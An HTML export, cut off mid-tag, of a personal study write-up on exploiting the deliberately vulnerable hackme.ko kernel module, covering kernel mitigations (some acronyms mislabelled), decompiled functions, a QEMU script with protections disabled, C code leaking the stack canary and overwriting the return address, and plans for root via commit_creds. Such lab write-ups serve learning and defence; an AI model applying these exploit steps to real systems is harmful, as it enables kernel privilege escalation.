@@ -1,0 +1,829 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Linux Kernel Exploitation[1] - Study Case</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="a33b6bf6-a380-413b-8556-0cd22f438d90" class="page sans"><header><h1 class="page-title"><strong><strong>Linux Kernel Exploitation[1] - Study Case</strong></strong></h1></header><div class="page-body"><p id="65261198-ecb1-48f2-805e-c558aab373db" class="">
+</p><p id="1595851b-c749-499e-97c9-0261ee7c52f2" class="">This is my first Linux kernel exploit. I started studying LKM (Loadable Kernel Module) development a few months ago and now I feel comfortable starting to learn about kernel exploitation. A friend recommended the contents of LKMIDAS on kernel exploitation to me, so this is a report about my studies based on their article.</p><p id="317704c7-ceaf-40c1-be80-09fd52b2755c" class="">Similar to user space, the kernel has some mitigations in place to prevent the exploitation of some vulnerabilities. It implements canaries in memory segments, address layout randomization, position independent executable and other possible mitigations. Some of these mitigations are very similar to those in user space, but they receive different names like KASLR.</p><ul id="120ac302-10c6-42ad-81e4-8c897b55d313" class="bulleted-list"><li style="list-style-type:disc">SMEP (Supervisor Mode Access Prevention) → sets all the userland pages to non-executable when the process are running in kernel mode, controlled in CR4 register.</li></ul><ul id="abc1aee5-7756-45dd-a92c-7567bb92e48c" class="bulleted-list"><li style="list-style-type:disc">SMAP (Kernel page-table isolation) → It’s like SMEP but it disables the userland pages, so you cannot read or write on it.</li></ul><ul id="8f54b5b7-2a17-44dc-bca6-495b93f3d067" class="bulleted-list"><li style="list-style-type:disc">KPTI (Kernel page-table isolation) → This functions separates the userland pages  tables and kernel land page tables. </li></ul><p id="e8d49b02-04f0-4515-9225-d564a37a68a7" class="">bzimage → Compressed Linux Kernel</p><p id="4c21b5d8-cff6-4efd-9d88-e5fc63e71c48" class="">initramfs → Linux file system compressed with <mark class="highlight-blue">cpio </mark>and <mark class="highlight-blue">gzip</mark>.</p><h3 id="069bac16-781a-4fa2-a217-3a28685dedf4" class="">Reverse Engineering | hackme.ko</h3><p id="20946043-d746-472e-a1d3-74d9bba68e12" class="">Recently I watched a video of LiveOverflow that talks about the modern reverse engineering process, I used this approach to work in my process.</p><p id="ca2864a2-c439-44d0-b31c-fb1983554e68" class="">At first i downloaded the binary provided by the LKMIDAS that is hackme.ko, it’s a kernel module x64, I used the IDA to transform the binary instructions in readable C code with the decompiler, with it we can analyze the code better.</p><p id="45f1fbfc-549f-45e6-a655-f6a64f2f4a58" class="">If you have ever coded a Linux kernel module, you must know that in order for the module to work, it needs to have an entry point and an exit point. We can locate two functions that perform these actions in the binary - the hackme_init and the hackme_exit.</p><figure id="a2a11277-ae83-4933-9828-00a7dc440c7d" class="image"><a href="images/Untitled.png"><img style="width:1633px" src="images/Untitled.png"/></a></figure><p id="992eaab4-68a9-46fb-9cfd-fd199097dd62" class="">These functions tell us that we can interact with the driver using the READ, WRITE, OPEN, RELEASE, and other system calls.</p><p id="a8353f7a-e1c5-49bc-a2b7-7cf92a0cbf08" class="">To better understand the code, I will copy it and provide comments explaining what each part does.</p><h3 id="468df40e-2bdb-4e87-b3b9-94debf161e44" class="">HACKME INIT -  Function</h3><p id="d16d4680-3d37-4a87-ae4b-9d2258cbd9a3" class="">The init function registers the device in the kernel. We can see that it simply returns the result of the misc_register function, which receives the address of hackme_misc.</p><figure id="e72cefdc-2583-490f-99a8-fef7fd555d19" class="image"><a href="images/Untitled%201.png"><img style="width:1390px" src="images/Untitled%201.png"/></a></figure><p id="49b9bb27-e9f1-457d-97a6-40d4ea369838" class="">If you want to understand more about misc_register, it&#x27;s a good idea to search for documentation. You can read more about it here: <a href="https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API-misc-register.html"><strong>https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API-misc-register.html</strong></a></p><p id="6f121474-0b26-4a76-969a-a8d7b2f46aa9" class="">As an argument, the function receives a structure of the miscdevice type. The following image shows how it&#x27;s built. <a href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/structmiscdevice.html">https://docs.huihoo.com/doxygen/linux/kernel/3.7/structmiscdevice.html</a></p><figure id="809c702d-6ba5-45fd-a9d6-e6b2c124a433" class="image"><a href="images/Untitled%202.png"><img style="width:694px" src="images/Untitled%202.png"/></a></figure><p id="50b242b5-1e04-4f16-bc20-e73988e25625" class="">So, that&#x27;s the structure. The name that will be displayed is “hackme”.</p><figure id="7303ee2d-da43-4408-9a42-a8db768288ab" class="image"><a href="images/Untitled%203.png"><img style="width:681px" src="images/Untitled%203.png"/></a></figure><h3 id="18db362b-675d-4703-9771-b4af8041c10c" class="">Hackme Exit</h3><p id="801b554e-3d9a-48c9-8825-bc44e9a7dd70" class="">The exit function only performs the action of unregistering the device, receiving the same structure of miscdevice type.</p><figure id="38e32855-0b2d-438a-b8d5-3762338a69ca" class="image"><a href="images/Untitled%204.png"><img style="width:982px" src="images/Untitled%204.png"/></a></figure><h3 id="8697c386-c883-49d2-996f-64e321c71fa5" class="">Hackme Write</h3><p id="70dcd5f3-e1b6-4873-a3a8-ef64aedef804" class="">There is a function used in this code that is called copy from user, that copies some data from userland to kernel-land.</p><p id="8627d49e-b170-4c0f-8b27-7fe45880b773" class="">Look the documentation about this function: <a href="https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API---copy-from-user.html">https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API---copy-from-user.html</a></p><p id="43fc7900-cbb6-4520-8816-5a3c8692e09e" class="">Some important things to known is about the return of the function, it returns zero if the copy was succeeded and an value of bytes that could not be copied.</p><p id="0adc3c78-aecd-49e0-b163-bce75f236c0c" class="">There is a size check with v4 to known if the received value is higher than 0x1000.</p><p id="f437d734-c8a2-4030-9cfa-0225a3bb3811" class="">
+</p><p id="b71b1aa1-5e48-4ae0-9cc1-82de93ce1409" class="">There is a function used in this code called <mark class="highlight-blue"><strong>copy_from_user</strong></mark>, which copies data from userland to kernel-land.</p><p id="85a43980-0de9-4da0-b720-a4914abe20de" class="">To learn more about this function, you can refer to the documentation at <a href="https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API---copy-from-user.html"><strong>https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API---copy-from-user.html</strong></a>.</p><p id="eac1f949-b0ff-4978-9244-f0c327d42c3c" class="">Some important things to note about this function are its return value - it returns zero if the copy was successful and a value of bytes that that cannot be copied.</p><p id="0bf382a9-c804-4318-b224-447caa0c4c53" class="">There is a size check with v4 to determine if the received value is higher than 0x1000.</p><figure id="8608a7bc-5b4d-4fb9-ab1e-f079507fde49" class="image"><a href="images/Untitled%205.png"><img style="width:704px" src="images/Untitled%205.png"/></a></figure><p id="826466e9-bd0f-43c0-84df-90d640ba2572" class="">
+</p><h3 id="d3f4dd18-e3ce-4c2a-815d-7b64302cf623" class="">Hackme Read</h3><p id="ba51a135-bec5-4509-9b86-32e8bb9e4e05" class="">So, the read function has a local variable called TMP with a size of 32 multiplied by int(4). The <mark class="highlight-blue">hackme_buf </mark>is a stack buffer that is copied to the TMP. There is a check to see if the size is higher than 0x1000. If so, it prints the message &#x27;buffer overflow detected&#x27;. Then, a copy to user is executed, which copies the data from the <mark class="highlight-blue">hackme_buf </mark>to the DATA reference. Please refer to the following documentation for more information: <a href="https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API---copy-to-user.html"><strong>https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API---copy-to-user.html</strong></a></p><figure id="6b217cd1-51be-4813-bab1-2c31ba54f95a" class="image"><a href="images/Untitled%206.png"><img style="width:661px" src="images/Untitled%206.png"/></a></figure><p id="60785435-6a7a-413c-8540-ea07aab4a441" class="">It&#x27;s important to also know that the function has cookie verifications, so if we perform some corruption in the stack, it needs to be bypassed.</p><figure id="e89a79dc-2c2b-4836-b947-b60a5110b287" class="image"><a href="images/Untitled%207.png"><img style="width:565px" src="images/Untitled%207.png"/></a></figure><p id="1156c95f-33b2-464c-baf8-bdf9fd18a459" class="">The article by LKMIDAS explains how to perform certain actions using the Ret2User technique. Essentially, it involves exploiting a program by injecting code that causes program jumps and overwrites the return address in the kernel with the address of the desired function, thereby executing the code in kernel mode.</p><p id="9407b6d0-dd9e-4716-ab8d-92f2a8183261" class="">The module is a system device, and we can interact with it in the /dev/ folder, which contains all the device files running on the system. We can work with C binaries to handle the opened file descriptor (FD) and perform interactions.</p><p id="13922e15-6f5e-4331-84dc-3beeab37eea2" class="">After understanding all the concepts in the article, let&#x27;s proceed with the exploitation. I will use GDB to attach to a remote target, which is the vmlinux running in QEMU with the DEBUG port enabled.</p><figure id="933b7b67-9a54-444c-b37c-fd6a9a6bb102" class="image"><a href="images/Untitled%208.png"><img style="width:1196px" src="images/Untitled%208.png"/></a></figure><p id="f269b3e1-f8bd-4239-b855-574484df1058" class="">Run script without protections:</p><pre id="b4ec5a1b-fd7d-42f8-b75e-6c6194a17e99" class="code"><code>#!/bin/sh
+
+qemu-system-x86_64 \
+    -m 128M \
+    -s \
+    -cpu kvm64 \
+    -kernel vmlinuz \
+    -initrd initramfs.cpio.gz \
+    -hdb flag.txt \
+    -snapshot \
+    -nographic \
+    -monitor /dev/null \
+    -no-reboot \
+    -append &quot;console=ttyS0 nopti nokaslr quiet panic=1&quot;</code></pre><p id="f2f45012-df89-47e7-b525-5ce7f4529b17" class="">The first step of the exploit is to leak the stack canary to perform other exploitations. If you look at the read function stack in the LKM, you will see that there is only one local variable, which is “int tmp[32]”. Therefore, the canary is located before it on the stack</p><pre id="dc99998d-02db-4746-bc22-161dad1e72c1" class="code"><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+
+#define SIZE_TMP 16
+
+unsigned long leak(int fd);
+ 
+unsigned long leak(int fd){
+	unsigned long buf[SIZE_TMP+8];
+	read(fd, buf, sizeof(buf));
+	return buf[SIZE_TMP];
+}
+
+int main(void){
+	int fd = open(&quot;/dev/hackme&quot;, O_RDWR);
+	if(!fd){
+		printf(&quot;[!]Error in openning descriptor\n&quot;);
+	}else{
+		printf(&quot;[OK]FD onpened\n&quot;);
+	}
+	unsigned long canary = leak(fd);
+	printf(&quot;Canary = 0x%lx\n&quot;, canary);
+
+
+
+	return 0;
+}</code></pre><p id="1b0da30c-8b77-4476-9ff1-bc9e97852da0" class="">The next step in the exploitation is to overwrite the <mark class="highlight-blue">ret </mark>function. In the assembly code, we can see three <mark class="highlight-blue">pops </mark>from the stack. This junk code needs to be written after the canary, because the canary verification is done before the &quot;pops&quot; that reside in the return call.</p><figure id="bd822fb4-c329-4eb3-ac75-34049a0bb590" class="image"><a href="images/Untitled%209.png"><img style="width:1081px" src="images/Untitled%209.png"/></a></figure><p id="9191fc6d-b90e-4e67-9684-9ed0e5e1647e" class="">This is the stack of the <mark class="highlight-blue">hackme_write </mark>function, which works in the same way as the function itself.</p><figure id="336ee561-ca26-4b82-8b0b-762efd1c1467" class="image"><a href="images/Untitled%2010.png"><img style="width:433px" src="images/Untitled%2010.png"/></a></figure><pre id="a5b84706-bc90-4fe5-b67f-a5afb54bfed1" class="code"><code>junk + canary + rbx_junk + r12_junk + rbp_junk + ret</code></pre><pre id="08148aa8-b196-4eaf-b759-31772bb16e2b" class="code"><code>void overwrite_ret(int fd, unsigned long canary, int ret){
+	unsigned long payload[SIZE_TMP+10];
+	payload[SIZE_TMP+1] = canary;
+	payload[SIZE_TMP+2] = 0x90;
+   	payload[SIZE_TMP+3] = 0x90;
+	payload[SIZE_TMP+4] = 0x90;	
+	payload[SIZE_TMP+5] = ret;
+	write(fd,payload,sizeof(payload));
+}</code></pre><h3 id="b0524959-f31d-43cd-b202-1b14737523a0" class="">Getting Root Privileges </h3><p id="22e6c856-2186-4f27-b411-e0caeef37899" class="">One of the issues addressed in the LKMIDAS report is the achievement of root privileges using the commit_creds and prepare_kernel_cred kernel functions. These functions are explained in detail in the following link: <a href="https://www.kernel.org/doc/Documentation/security/credentials.txt"><strong>https://www.kernel.org/doc/Documentation/security/credentials.txt</strong></a>.</p><p id="b4b2bbaf-b606-475f-8a2d-2f345c18888a" class="">This approach to kernel exploitation works without any protection in the kernel space, allowing easy access to the kernel symbol table and the addresses of these two functions.</p><p id="027db85c-3af0-4a59-a864-ca94b158ddd8" class="">The final steps of the exploit can be done using ASM code in a C exploit file. For more information, please refer to: <a href="https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html"><strong>https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html</strong></a>.</p><p id="d45e0bdc-38e4-490e-81f8-dd934df95bf4" class="">To access the addresses of the commit_creds and prepare_kernel_cred kernel functions, you need to access the &quot;/proc/kallsyms&quot; file, which contains the kernel symbol table. To access this file, you must change your session to root, edit &quot;/etc/init.d/rcS&quot;, and set the last line as &quot;setuidgid 0 /bin/sh&quot;. After collecting the addresses, remove this line.&quot;</p><figure 